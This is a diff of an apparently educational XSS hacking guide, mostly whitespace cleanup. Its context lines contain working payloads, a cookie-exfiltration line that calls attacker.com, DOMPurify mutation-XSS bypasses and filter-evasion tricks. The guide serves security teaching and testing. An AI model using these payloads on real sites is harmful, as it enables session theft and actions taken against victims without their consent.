@@ -81,7 +81,7 @@ For the **Attribute context** as an example, we could exploit it by 1. Escaping 
 </strong>&#x3C;img src="" onerror=alert() x="">
 </code></pre>
 
-When this is rendered to the page, the image with `src=""` will likely fail to load as the current page is not an image. Then the `onerror=` handler is triggered to pop an alert box open, and the tag is closed cleanly. This is the basic idea for all JavaScript Injections. The following sections will explore the various contexts in more detail.&#x20;
+When this is rendered to the page, the image with `src=""` will likely fail to load as the current page is not an image. Then the `onerror=` handler is triggered to pop an alert box open, and the tag is closed cleanly. This is the basic idea for all JavaScript Injections. The following sections will explore the various contexts in more detail.
 
 ### HTML Injection
 
@@ -91,9 +91,9 @@ With zero protections, the simplest-to-understand injection is:
 <script>alert()</script>
 ```
 
-This starts JavaScript syntax using the `<script>` tag, and executes the `alert()` function. There are however a few caveats that will result in this payload _not always working_. The most important is the difference between **server-inserted** code and **client-inserted** code. \
-When the server inserts your script into the HTML, the browser doesn't know any better and trusts the code so it will be run as if it is part of the first original page. \
-When instead the code is possibly fetched and then inserted by some other client-side JavaScript code like `element.innerHTML = "<script>..."`, it will be inserted after the document has already loaded, and follow some different rules. For one, inline scripts like these **won't** execute directly, as well as some other elements that are not directly loaded after they have been inserted into the DOM.&#x20;
+This starts JavaScript syntax using the `<script>` tag, and executes the `alert()` function. There are however a few caveats that will result in this payload _not always working_. The most important is the difference between **server-inserted** code and **client-inserted** code.\
+When the server inserts your script into the HTML, the browser doesn't know any better and trusts the code so it will be run as if it is part of the first original page.\
+When instead the code is possibly fetched and then inserted by some other client-side JavaScript code like `element.innerHTML = "<script>..."`, it will be inserted after the document has already loaded, and follow some different rules. For one, inline scripts like these **won't** execute directly, as well as some other elements that are not directly loaded after they have been inserted into the DOM.
 
 Because of the above reasons, it is often a safer idea to use a common payload like:
 
@@ -110,11 +110,11 @@ In some cases a common variation is the following:
 <strong>&#x3C;style onload=alert()>
 </strong></code></pre>
 
-The small difference between these two payloads is that the first works everywhere except **Firefox client-inserted**, and the second works everywhere while remaining relatively short.&#x20;
+The small difference between these two payloads is that the first works everywhere except **Firefox client-inserted**, and the second works everywhere while remaining relatively short.
 
 #### Special Tags
 
-When inserted into the content of a `<textarea>`, JavaScript code won't be directly executed in any way. Therefore you need to first close this specific tag using `</textarea>`, and then continue with a regular XSS payload like normal.&#x20;
+When inserted into the content of a `<textarea>`, JavaScript code won't be directly executed in any way. Therefore you need to first close this specific tag using `</textarea>`, and then continue with a regular XSS payload like normal.
 
 <pre class="language-html"><code class="lang-html">&#x3C;!-- Doesn't execute -->
 &#x3C;textarea>&#x3C;img src onerror=alert()>&#x3C;/textarea>
@@ -165,7 +165,7 @@ One last payload is a less well-known tag called `<base>` which takes an `href=`
 </code></pre>
 
 {% hint style="info" %}
-To exploit and show a proof of concept of the above trick, I set up [xss.jorianwoltjer.com](https://xss.jorianwoltjer.com/) which  returns the same script for **every path** with any payload you put into that **URL hash**. This means you can include this injection anywhere, and put a JavaScript payload after the `#` symbol of the target URL which will then be executed:\
+To exploit and show a proof of concept of the above trick, I set up [xss.jorianwoltjer.com](https://xss.jorianwoltjer.com/) which returns the same script for **every path** with any payload you put into that **URL hash**. This means you can include this injection anywhere, and put a JavaScript payload after the `#` symbol of the target URL which will then be executed:\
 [http://example.com/path#alert(document.domain)](http://example.com/path#alert\(document.domain\))
 {% endhint %}
 
@@ -175,7 +175,7 @@ In case you really can't get a full-blown XSS, check out what other impactful th
 
 #### Alternative Impact
 
-**Styles** using CSS can also be dangerous. Not only to restyle the page, but with selectors and URLs any secrets on the page like CSRF tokens or other private data can be exfiltrated. For details on exploiting this, see [this introduction](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d), an [improved version using `@import`](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b), and finally [this tool](https://github.com/d0nutptr/sic).&#x20;
+**Styles** using CSS can also be dangerous. Not only to restyle the page, but with selectors and URLs any secrets on the page like CSRF tokens or other private data can be exfiltrated. For details on exploiting this, see [this introduction](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d), an [improved version using `@import`](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b), and finally [this tool](https://github.com/d0nutptr/sic).
 
 ### Attribute Injection
 
@@ -243,7 +243,7 @@ Another special place you might find yourself injecting into is **template liter
 
 #### Double Injection `\` backslash trick
 
-One last trick is useful when you **cannot escape** the string with just a `"` quote, but when you do have **two injections on the same line**.&#x20;
+One last trick is useful when you **cannot escape** the string with just a `"` quote, but when you do have **two injections on the same line**.
 
 <pre class="language-html" data-title="Failed attempt"><code class="lang-html"><strong>Payload 1: "-alert()//
 </strong><strong>Payload 2: something
@@ -252,7 +252,7 @@ One last trick is useful when you **cannot escape** the string with just a `"` q
 &#x3C;/script>
 </code></pre>
 
-The important piece of knowledge is that any character escaped using a `\` backslash character, which will interpret the character as data instead of code (see [here ](../../../languages/javascript/#inside-a-string)for a table of all special backslash escapes). \
+The important piece of knowledge is that any character escaped using a `\` backslash character, which will interpret the character as data instead of code (see [here ](../../../languages/javascript/#inside-a-string)for a table of all special backslash escapes).\
 With this knowledge, we know a `\"` character will continue the string and not stop it. Therefore if we **end** our input with a `\` character, a `"` quote will be appended to it which would normally close the string, but because of our injection cause it to continue and mess up the syntax:
 
 <pre class="language-html" data-title="Injection causes error"><code class="lang-html"><strong>Payload 1: anything\
@@ -275,7 +275,7 @@ The critical part here is that the 2nd string that would normally _start_ the st
 
 When injecting into a script tag that disallows quotes (`"`), you may quickly jump to injecting `</script>` to close the whole script tag and start a new one with your payload. If the `/` character is not allowed, however, you cannot close the script tag in this way.
 
-Instead, we can abuse a lesser-known feature of script contents ([spec](https://html.spec.whatwg.org/multipage/scripting.html#restrictions-for-contents-of-script-elements)), where for legacy reasons, \
+Instead, we can abuse a lesser-known feature of script contents ([spec](https://html.spec.whatwg.org/multipage/scripting.html#restrictions-for-contents-of-script-elements)), where for legacy reasons,\
 a closing script tag (`</script>`) inside `<!--` doesn't actually close the current script. Note that this is in JavaScript syntax, and that this can occur anywhere, like inside of a string. Only once some later input closes the script tag an extra time does it actually close!\
 This strange behavior occurs because ([source](https://htmlparser.info/parser/#script-states)):
 
@@ -330,7 +330,7 @@ The **D**ocument **O**bject **M**odel (DOM) is JavaScript's view of the HTML on 
 </script>
 ```
 
-Sources are where data comes from, and there are many for JavaScript. There might be a URL parameter from [`URLSearchParams`](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams/URLSearchParams) that is put in some HTML code, `location.hash` for `#...` data after a URL, simply a `fetch()`, `document.referrer`, and even `"message"` listeners which allow [`postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) communication between origins.&#x20;
+Sources are where data comes from, and there are many for JavaScript. There might be a URL parameter from [`URLSearchParams`](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams/URLSearchParams) that is put in some HTML code, `location.hash` for `#...` data after a URL, simply a `fetch()`, `document.referrer`, and even `"message"` listeners which allow [`postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) communication between origins.
 
 When any of this controllable data ends up in a sink without enough sanitization, you might have an XSS on your hands. Just like contexts, different sinks require different payloads. A `location =` sink for example, can be exploited using the `javascript:alert()` protocol to evaluate the code, and an `eval()` sink could require escaping the context like in [#script-injection](./#script-injection "mention").
 
@@ -350,7 +350,7 @@ A snippet like the following was very commonly exploited ([source](https://ports
 });
 </code></pre>
 
-Here the `location.hash` _source_ is put into the vulnerable _sink_, which is exploitable with a simple `#<img src onerror=alert()>` payload. In the snippet, this is called on the [`hashchange`](https://developer.mozilla.org/en-US/docs/Web/API/Window/hashchange_event) event it is not yet triggered on page load, but only after the hash has _changed_. In order to exploit this, we need to load the page normally first, and then after some time when the page has loaded we can replace the URL of the active window which will act as a "change". Note that **reading** a location is not allowed cross-origin, but **writing** a new location is, so we can abuse this.&#x20;
+Here the `location.hash` _source_ is put into the vulnerable _sink_, which is exploitable with a simple `#<img src onerror=alert()>` payload. In the snippet, this is called on the [`hashchange`](https://developer.mozilla.org/en-US/docs/Web/API/Window/hashchange_event) event it is not yet triggered on page load, but only after the hash has _changed_. In order to exploit this, we need to load the page normally first, and then after some time when the page has loaded we can replace the URL of the active window which will act as a "change". Note that **reading** a location is not allowed cross-origin, but **writing** a new location is, so we can abuse this.
 
 If the target allows being iframed, a simple way to exploit this is by loading the target and changing the `src=` attribute after it loads:
 
@@ -376,7 +376,7 @@ Otherwise, you can still load and change a URL by `open()`'ing it in a new windo
 ```
 {% endcode %}
 
-Important to note is that the vulnerable code above with `$(location.hash)` above is **not vulnerable anymore** with recent versions of JQuery because an extra rule was added that selectors _starting_ with `#` are _not_ allowed to have HTML, but **anything else is still vulnerable**. A snippet like below will still be vulnerable in modern versions because it is not prefixed with `#`, and it URL decodes the payload allowing the required special characters. Context does not matter here, simply `<img src onerror=alert()>` anywhere in the selector will work.&#x20;
+Important to note is that the vulnerable code above with `$(location.hash)` above is **not vulnerable anymore** with recent versions of JQuery because an extra rule was added that selectors _starting_ with `#` are _not_ allowed to have HTML, but **anything else is still vulnerable**. A snippet like below will still be vulnerable in modern versions because it is not prefixed with `#`, and it URL decodes the payload allowing the required special characters. Context does not matter here, simply `<img src onerror=alert()>` anywhere in the selector will work.
 
 {% code title="Modern vulnerable example" %}
 ```javascript
@@ -385,7 +385,7 @@ $(`h2:contains(${hash})`);
 ```
 {% endcode %}
 
-JQuery also has many other methods and CVEs if malicious input ends up in specific functions. Make sure to check all functions your input travels through for possible DOM XSS.&#x20;
+JQuery also has many other methods and CVEs if malicious input ends up in specific functions. Make sure to check all functions your input travels through for possible DOM XSS.
 
 #### Triggers (HTML sinks)
 
@@ -407,15 +407,19 @@ When placing common XSS payloads in the triggers above, it becomes clear that th
 
 <figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Table of XSS payloads and DOM sinks that trigger them (<mark style="color:yellow;">yellow</mark> = Chrome but not Firefox)</p></figcaption></figure>
 
+{% file src="../../../.gitbook/assets/domxss-trigger-table.html" %}
+**Source code** for script used to generate and **test** the results in the table above
+{% endfile %}
+
 ### Client-Side Template Injection
 
 Templating frameworks help fill out HTML with user data and try to make interaction easier. While this often helps with auto-escaping special characters, it can hurt in some other ways when the templating language itself can be injected without HTML tags, or using normally safe HTML that isn't sanitized.
 
 #### [AngularJS](https://docs.angularjs.org/guide/templates)
 
-AngularJS is a common web framework for the frontend. It allows easy interactivity by adding special attributes and syntax that it recognizes and executes. This also exposes some new ways for HTML/Text injections to execute arbitrary JavaScript if regular ways are blocked. One caveat is that all these injections need to happen inside an element with an `ng-app` attribute to enable this feature.&#x20;
+AngularJS is a common web framework for the frontend. It allows easy interactivity by adding special attributes and syntax that it recognizes and executes. This also exposes some new ways for HTML/Text injections to execute arbitrary JavaScript if regular ways are blocked. One caveat is that all these injections need to happen inside an element with an `ng-app` attribute to enable this feature.
 
-When this is enabled, however, many possibilities open up. One of the most interesting is template injection using `{{` characters inside a text string, no HTML tags are needed here! This is a rather well-known technique though, so it may be blocked. In cases of HTML injection with strong filters, you may be able to add custom attributes bypassing filters like [DOMPurify](https://github.com/cure53/DOMPurify). See [this presentation by Masato Kinugawa](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=33) for some AngularJS tricks that managed to bypass Teams' filters.&#x20;
+When this is enabled, however, many possibilities open up. One of the most interesting is template injection using `{{` characters inside a text string, no HTML tags are needed here! This is a rather well-known technique though, so it may be blocked. In cases of HTML injection with strong filters, you may be able to add custom attributes bypassing filters like [DOMPurify](https://github.com/cure53/DOMPurify). See [this presentation by Masato Kinugawa](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=33) for some AngularJS tricks that managed to bypass Teams' filters.
 
 Here are a few examples of how it can be abused on the latest version. All alerts fire on load:
 
@@ -451,14 +455,14 @@ Escape different AngularJS version sandboxes
 {% endembed %}
 
 {% hint style="warning" %}
-**Warning**:&#x20;
+**Warning**:
 
-**Newer versions** of _Angular (v2+)_ instead of _AngularJS (v1)_ are not vulnerable in this way. \
+**Newer versions** of _Angular (v2+)_ instead of _AngularJS (v1)_ are not vulnerable in this way.\
 Read more about this in [angular.md](../../frameworks/angular.md "mention").
 {% endhint %}
 
 {% hint style="info" %}
-**Note**: Injecting content with `.innerHTML` does not always work, because it is only triggered _when AngularJS loads_. If you inject content later from a fetch, for example, it would not trigger even if a parent contains `ng-app`.&#x20;
+**Note**: Injecting content with `.innerHTML` does not always work, because it is only triggered _when AngularJS loads_. If you inject content later from a fetch, for example, it would not trigger even if a parent contains `ng-app`.
 
 You may still be able to exploit this by slowing down the AngularJS script loading by **filling up the browser's connection pool**. [See this challenge writeup for details](https://blog.ryotak.net/post/dom-based-race-condition/).
 {% endhint %}
@@ -627,11 +631,11 @@ For a searchable list of all characters that do and don't work, see [this gist](
 
 ## Exploitation
 
-Making an `alert()` pop up is cool, but to show the impact it might be necessary to exploit what an XSS or JavaScript execution gives you. The summary is that you can do almost everything a user can do themselves, but do this for them. You can click buttons, request pages, post data, etc. which open up a large field of impact, depending on what an application lets the user do.&#x20;
+Making an `alert()` pop up is cool, but to show the impact it might be necessary to exploit what an XSS or JavaScript execution gives you. The summary is that you can do almost everything a user can do themselves, but do this for them. You can click buttons, request pages, post data, etc. which open up a large field of impact, depending on what an application lets the user do.
 
 ### From another site
 
-The _Cross-Site_ in XSS means that it should be exploitable from another malicious site, which can then perform actions on the victim's behalf on the target site. It is always a good idea to test exploits locally first with a simple web server like `php -S 0.0.0.0:8000`, and when you need to exploit something remotely it can be hosted temporarily with a tool like [ngrok](https://ngrok.com/), or permanently with a web server of your own.&#x20;
+The _Cross-Site_ in XSS means that it should be exploitable from another malicious site, which can then perform actions on the victim's behalf on the target site. It is always a good idea to test exploits locally first with a simple web server like `php -S 0.0.0.0:8000`, and when you need to exploit something remotely it can be hosted temporarily with a tool like [ngrok](https://ngrok.com/), or permanently with a web server of your own.
 
 The easiest is **Reflected XSS**, which should trigger when a specific URL is triggered. If someone visits your page, you can simply redirect them to the malicious URL with any payload to trigger the XSS:
 
@@ -647,9 +651,9 @@ The easiest is **Reflected XSS**, which should trigger when a specific URL is tr
 Note that [URL Encoding](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)\&input=PHN0eWxlIG9ubG9hZD1hbGVydCgpPg) might be needed on parameters to make sure special characters are not part of the URL, or to simply obfuscate the payload
 {% endhint %}
 
-For **Stored XSS**, a more likely scenario might be someone else stumbling upon the payload by using the site normally, but if the location is known by the attacker they can also redirect a victim to it in the same way as Reflected XSS as shown above.&#x20;
+For **Stored XSS**, a more likely scenario might be someone else stumbling upon the payload by using the site normally, but if the location is known by the attacker they can also redirect a victim to it in the same way as Reflected XSS as shown above.
 
-Some exploits require more complex interaction between the attacker and the target site, like `<iframe>`'ing (only if [#content-security-policy-csp](./#content-security-policy-csp "mention") and `X-Frame-Options` allows) or opening windows (only when handling user interaction like pressing a button with `onclick=`).&#x20;
+Some exploits require more complex interaction between the attacker and the target site, like `<iframe>`'ing (only if [#content-security-policy-csp](./#content-security-policy-csp "mention") and `X-Frame-Options` allows) or opening windows (only when handling user interaction like pressing a button with `onclick=`).
 
 ### Stealing Cookies
 
@@ -659,7 +663,7 @@ In the early days of XSS, this was often the target vector for exploitation, as 
 fetch("http://attacker.com/leak?cookie=" + document.cookie)
 ```
 
-Pretty often, however, modern frameworks will set the `httpOnly` flag on cookies which means they will **not** be available for JavaScript, only when making HTTP requests. This `document.cookie` variable will simply not contain the cookie that the flag is on, meaning it cannot be exfiltrated directly. But the possibilities do not end here, as you can still **make requests** using the cookies from within JavaScript, just not directly read them.&#x20;
+Pretty often, however, modern frameworks will set the `httpOnly` flag on cookies which means they will **not** be available for JavaScript, only when making HTTP requests. This `document.cookie` variable will simply not contain the cookie that the flag is on, meaning it cannot be exfiltrated directly. But the possibilities do not end here, as you can still **make requests** using the cookies from within JavaScript, just not directly read them.
 
 {% hint style="warning" %}
 In very restricted scenarios you might not be able to make an outbound connection due to the `connect-src` [#content-security-policy-csp](./#content-security-policy-csp "mention") directive. See that chapter for ideas on how to still exfiltrate data
@@ -771,10 +775,10 @@ XSS is a well-known issue, and many protections try to limit its possibility on 
 1. Content, but **no HTML** is allowed (almost all data)
 2. **Limited HTML tags** are allowed (rich text like editors)
 
-The **1st** is very easily protected by using HTML Encoding. Many frameworks already do this by default, and explicitly have you write some extra code to turn it off. Most often this encodes only the special characters like `<` to `&lt;`, `>` to `&gt;`, and `"` to `&quot;`. While this type of protection is completely safe in most cases, some situations exist where these specific characters are _not required_ to achieve XSS. We've seen examples of [#attribute-injection](./#attribute-injection "mention") where a `'` single quote is used instead, which may not be encoded and thus can be escaped. Or when your attribute is not enclosed at all and a simple   space character can add another malicious attribute. With [#script-injection](./#script-injection "mention") this is a similar story, as well as [#dom-xss](./#dom-xss "mention").&#x20;
+The **1st** is very easily protected by using HTML Encoding. Many frameworks already do this by default, and explicitly have you write some extra code to turn it off. Most often this encodes only the special characters like `<` to `&lt;`, `>` to `&gt;`, and `"` to `&quot;`. While this type of protection is completely safe in most cases, some situations exist where these specific characters are _not required_ to achieve XSS. We've seen examples of [#attribute-injection](./#attribute-injection "mention") where a `'` single quote is used instead, which may not be encoded and thus can be escaped. Or when your attribute is not enclosed at all and a simple space character can add another malicious attribute. With [#script-injection](./#script-injection "mention") this is a similar story, as well as [#dom-xss](./#dom-xss "mention").
 
-The **2nd** case is _very hard_ to protect securely. First, because many tags have unexpected abilities, like the `<a href=javascript:alert()>` protocol. If posting links is allowed, they need to think about preventing the `javascript:` protocol specifically and allowing regular `https://` links. There exist a ton of different tags and attributes that can execute JavaScript (see the [Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) making a blocklist almost infeasible, and an allowlist should be used. \
-The second reason this is hard is because browsers are _weird_, like _really weird_. The [HTML Specification](https://html.spec.whatwg.org/) contains a lot of rules and edge cases a filter should handle. If a filter parses a specially crafted payload differently from a browser, the malicious data might go unnoticed and end up executing in the victim's browser.&#x20;
+The **2nd** case is _very hard_ to protect securely. First, because many tags have unexpected abilities, like the `<a href=javascript:alert()>` protocol. If posting links is allowed, they need to think about preventing the `javascript:` protocol specifically and allowing regular `https://` links. There exist a ton of different tags and attributes that can execute JavaScript (see the [Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) making a blocklist almost infeasible, and an allowlist should be used.\
+The second reason this is hard is because browsers are _weird_, like _really weird_. The [HTML Specification](https://html.spec.whatwg.org/) contains a lot of rules and edge cases a filter should handle. If a filter parses a specially crafted payload differently from a browser, the malicious data might go unnoticed and end up executing in the victim's browser.
 
 One common protection is a `Content-Security-Policy:` response header, which can protect against various client-side attacks by restricting what researches may be "trusted" and executed:
 
@@ -806,7 +810,7 @@ Easy to use JavaScript/HTML fuzzing tool with shared results
 
 #### JavaScript payload
 
-In case you are able to inject JavaScript correctly but are unable to exploit it due to the filter blocking your JavaScript payload, there are many tricks to still achieve code execution. One of them is using the `location` variable, which can be assigned to a `javascript:` URL just like in DOM XSS, but this is now a very simple function call trigger as we don't need parentheses or backticks, as we can escape them in a string like `\x28` and `\x29`.&#x20;
+In case you are able to inject JavaScript correctly but are unable to exploit it due to the filter blocking your JavaScript payload, there are many tricks to still achieve code execution. One of them is using the `location` variable, which can be assigned to a `javascript:` URL just like in DOM XSS, but this is now a very simple function call trigger as we don't need parentheses or backticks, as we can escape them in a string like `\x28` and `\x29`.
 
 ```
 location="javascript:alert\x28\x29"
@@ -874,7 +878,7 @@ See what happened here? It suddenly closed with the `</title>` tag and started a
 <strong>&#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert(2)>">&#x3C;/p>
 </strong></code></pre>
 
-DOMPurify does not know of the `<title>` tag the application puts it in later, so it can only say if the HTML is safe on its own. In this case, it is, so we bypass the check through Mutation XSS.&#x20;
+DOMPurify does not know of the `<title>` tag the application puts it in later, so it can only say if the HTML is safe on its own. In this case, it is, so we bypass the check through Mutation XSS.
 
 <figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Example from <a href="https://mizu.re/post/intigriti-october-2023-xss-challenge">mizu.re's writeup</a> showing the difference between the browser and DOMPurify</p></figcaption></figure>
 
@@ -900,7 +904,7 @@ Where this gets really powerful is using HTML encoding if the sanitizer parses t
 </code></pre>
 
 This is another DOMPurify "bypass" with a more common threat, all a developer needs to do is put your payload inside of an `<svg>` tag, without sanitizing it with the `<svg>` tag. This payload is a bit more complicated as you'll see, but **here's a breakdown**:\
-The trick is the difference between SVG parsing and HTML parsing. _In HTML_ which DOMPurify sees, the `<style>` tag is special as it switches the parsing context to CSS, which doesn't support comments like `<!--` and it won't be interpreted as such. Therefore the `</style>` closes it and the `<a id="...">` opens another innocent tag and attribute. DOMPurify doesn't notify anything wrong here and won't alter the input. \
+The trick is the difference between SVG parsing and HTML parsing. _In HTML_ which DOMPurify sees, the `<style>` tag is special as it switches the parsing context to CSS, which doesn't support comments like `<!--` and it won't be interpreted as such. Therefore the `</style>` closes it and the `<a id="...">` opens another innocent tag and attribute. DOMPurify doesn't notify anything wrong here and won't alter the input.\
 _&#x49;n SVG,_ however, the `<style>` tag doesn't exist and it is interpreted as any other invalid tag in XML. The children inside might be more tags, a `<!--` comment in this case. This only ends at the start of the `<a id="--!>` attribute and that means after the comment comes more raw HTML. Then our `<img onerror=>` tag is read for real and the JavaScript is executed!
 
 {% hint style="info" %}
